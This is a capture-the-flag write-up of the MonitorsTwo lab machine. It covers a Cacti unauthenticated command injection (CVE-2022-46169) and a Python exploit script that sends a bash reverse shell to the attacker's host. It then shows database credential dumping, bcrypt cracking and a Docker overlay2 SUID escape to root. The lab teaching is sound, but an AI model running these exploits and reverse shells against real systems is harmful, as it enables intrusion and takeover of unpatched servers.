---
layout: post
title: "HTB: MonitorsTwo"
subtitle: "Cacti unauth RCE inside a container, crack marcus, then a Docker overlay2 escape to host root"
date: 2023-05-02
tags: [htb, linux, cacti, rce, docker, container-escape]
category: writeups
kind: machine
tldr: "Cacti is vulnerable to unauthenticated RCE via remote_agent.php (CVE-2022-46169), landing www-data inside a Docker container. The container config.php has database creds, I crack marcus's bcrypt to funkymonkey and SSH in. Host root comes from CVE-2021-41091: lax overlay2 permissions let me run a SUID bash planted from inside the container."
---

## the box

MonitorsTwo is a Linux box fronted by Cacti. The whole machine is layered access. The Cacti RCE only reaches a container as `www-data`, a cracked database hash only reaches the user marcus, and neither of those is root. Root comes from a Docker default lining up wrong, where container root equals host root through a filesystem path marcus is allowed to walk.

Two ports:

```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http  nginx 1.18.0 (Ubuntu)
```

## recon

Wide scan first, then service detection on the open ports:

```bash
nmap -p- --min-rate 10000 10.129.51.52
nmap -p 22,80 -sCV 10.129.51.52
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Port `80` is a Cacti login page. The footer of the login page gives the version away: `1.2.22`. Cacti is a PHP network graphing front end, and `1.2.22` is squarely in range for CVE-2022-46169.

CVE-2022-46169 is an unauthenticated command injection in `remote_agent.php`. The script first decides whether the caller is allowed by resolving a client address and checking it against the hosts Cacti knows about. The problem is that it builds that client address from user-controlled headers, walking `X-Forwarded-For` before falling back to the real socket address. So setting `X-Forwarded-For: 127.0.0.1` makes the script believe the request came from an authorized poller and the access gate opens.

Past the gate, the `action=polldata` path looks up a data source, and for templates that carry a script action (`POLLER_ACTION_SCRIPT_PHP`, present on the predefined "Device - Uptime" template), the `poller_id` parameter is concatenated into a shell command with no sanitisation. The request shape needs a real `host_id` and a `local_data_ids[]` that exists, and the command rides on `poller_id`:

```
/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=1;<command>
```

Most public PoCs failed against this box. They auto-detect a working `local_data_ids` by matching `rrd_name` values such as `polling_time` or `cmd.php` in the JSON response, but MonitorsTwo only exposes the `uptime` data source, so their match strings never hit and the brute force reports nothing usable. I fuzzed the ids by hand in Burp Repeater instead, with `X-Forwarded-For: 127.0.0.1` added, walking `host_id` and `local_data_ids[0]`:

```
GET /remote_agent.php?action=polldata&local_data_ids[0]=1&host_id=1&poller_id=1
```

`host_id=1` was valid and `local_data_ids[0]=6` returned data with `rrd_name` set to `uptime`, which is the vulnerable template. Before throwing a shell I confirmed the injection with a timing probe so I was not guessing:

```
poller_id=1;sleep 5
```

The response went from ~255ms to ~5.2s, so the command ran.

Once I knew the box only answered to `uptime`, I rewrote the brute force as a small script so the whole thing was one command. It is the same logic the public PoCs use, except the `rrd_name` allowlist includes `uptime`, which is the only change that mattered here. It walks `host_id` 1-4 and `local_data_ids[]` 1-9 with `X-Forwarded-For: 127.0.0.1`, stops on the first id pair whose `rrd_name` is `polling_time` or `uptime`, then fires the reverse shell on `poller_id`:

```python
import requests
import urllib.parse

def checkVuln():
    result = requests.get(vulnURL, headers=header)
    return (result.text != "FATAL: You are not authorized to use this service" and result.status_code == 200)

def bruteForce():
    for i in range(1, 5):
        for j in range(1, 10):
            vulnIdURL = f"{vulnURL}?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
            result = requests.get(vulnIdURL, headers=header)
            if result.text != "[]":
                rrdName = result.json()[0]["rrd_name"]
                if rrdName == "polling_time" or rrdName == "uptime":
                    return True, i, j
    return False, -1, -1

def remoteCodeExecution(payload, idHost, idLocal):
    encodedPayload = urllib.parse.quote(payload)
    injectedURL = f"{vulnURL}?action=polldata&poller_id=;{encodedPayload}&host_id={idHost}&local_data_ids[]={idLocal}"
    result = requests.get(injectedURL, headers=header)
    print(result.text)

if __name__ == "__main__":
    targetURL = "http://10.129.51.52/"
    vulnURL = f"{targetURL}/remote_agent.php"
    header = {"X-Forwarded-For": "127.0.0.1"}
    if checkVuln():
        isVuln, idHost, idLocal = bruteForce()
        ipAddress = "10.10.14.6"
        port = "443"
        payload = f"bash -c 'bash -i >& /dev/tcp/{ipAddress}/{port} 0>&1'"
        if isVuln:
            remoteCodeExecution(payload, idHost, idLocal)
```

The manual request that the script reduces to, the reverse shell on `poller_id` URL-encoded:

```
poller_id=1;bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261
```

With a listener waiting:

```bash
nc -lnvp 443
```

```
Connection received on 10.129.51.52 57164
www-data@50bca5e748b0:/var/www/html$
```

## foothold

The shell is `www-data`, but the prompt hostname `50bca5e748b0` is a giveaway, and the rest confirms a Docker container, not the host:

```bash
id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
ls -la /.dockerenv
cat /proc/net/fib_trie
```

`/.dockerenv` exists at the root, common tools like `ip`, `ifconfig`, and `ping` are missing, and `fib_trie` shows the container address `172.19.0.3`. linpeas later filled in the rest: full container ID `50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e`, seccomp enabled, AppArmor `docker-default` in enforce mode.

## user

Cacti's config holds the database connection, and it points at a separate container named `db`:

```bash
cat /var/www/html/include/config.php
```

```php
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
```

From the Cacti container I reached the `db` host and dumped the `user_auth` table:

```bash
mysql -h db -u root -proot cacti -e 'select username,password from user_auth;'
```

```
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
```

The `admin` and `marcus` rows are `$2y$` bcrypt at cost 10. I cracked marcus's hash with hashcat mode `3200`:

```bash
hashcat -a 0 -m 3200 hash /usr/share/seclists/rockyou.txt
```

It fell to `funkymonkey`. That password is reused for SSH on the actual host, so marcus on the host is a real account, not just a Cacti login:

```bash
ssh marcus@10.129.51.52   # funkymonkey
```

marcus owns the user flag in the home directory. The database creds also turn up in the `entrypoint.sh` of the Cacti image, which seeds the `cacti` schema with `root:root` on first boot, so the password is not a one-off, it is baked into the container build.

## root

marcus on the host is a regular user, and the container shell happens to be root inside the container. The connection between those two facts is spelled out in marcus's mail. `/var/mail/marcus` holds a security bulletin naming three CVEs, the third being the one that matters:

```
CVE-2021-33033:  Linux kernel use-after-free in CIPSO/CALIPSO refcounting (before 5.11.14).
CVE-2020-25706:  Cacti 1.2.13 XSS in the xml_path field during template import preview.
CVE-2021-41091:  This vulnerability affects Moby ... Attackers could exploit
                 this by traversing directory contents and executing programs on the
                 data directory with insufficiently restricted permissions. Fixed in
                 Moby (Docker Engine) 20.10.9.
```

CVE-2021-41091 is the path. Docker Engine before 20.10.9 leaves the `/var/lib/docker/overlay2` data directory world-traversable (mode 701 rather than 700). Every running container's live filesystem is assembled at a `merged` directory under that path, on the host. Without user-namespace remapping, UID 0 inside the container is UID 0 on the host. So a SUID-root binary created inside the container is a SUID-root binary on the host, and any host user who can `cd` into the overlay path can run it.

First I found the overlay path on the host with `mount`:

```bash
mount | grep overlay
```

```
overlay on /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```

The container shell was still `www-data`, but the container ships with enough capabilities (`cap_setuid`, `cap_setgid`) that `capsh` jumps straight to root inside the container, no kernel exploit needed. `/sbin/capsh` is even SUID in the container. This is the GTFOBins technique:

```bash
capsh --gid=0 --uid=0 --
```

```
root@50bca5e748b0:/tmp#
```

Now root inside the container, I copied bash out and set it SUID so the bit is explicit and the binary is mine, not the system one:

```bash
cp /bin/bash /tmp/0xdf
chmod 4777 /tmp/0xdf
```

Back on the host as marcus, that same binary now sits SUID root under the container's merged path. Running it with `-p` keeps the effective UID instead of dropping privileges the way bash normally does for SUID:

```bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/0xdf -p
```

```
0xdf-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
```

That is effective root on the host, and the root flag is in `/root/root.txt`.

## takeaway

The whole box is layered access. The Cacti RCE only reaches a container, the cracked password only reaches marcus, and neither is root. The escape works because two defaults line up, overlay2 at permissive permissions and no userns remapping, so container root equals host root through a path marcus is allowed to traverse. The container even hands you the capabilities to become root locally, so no second exploit is needed. I wrote the overlay2 escape up in detail as a standalone PoC, see the [CVE-2021-41091 post]({{ '/cve-2021-41091/' | relative_url }}).
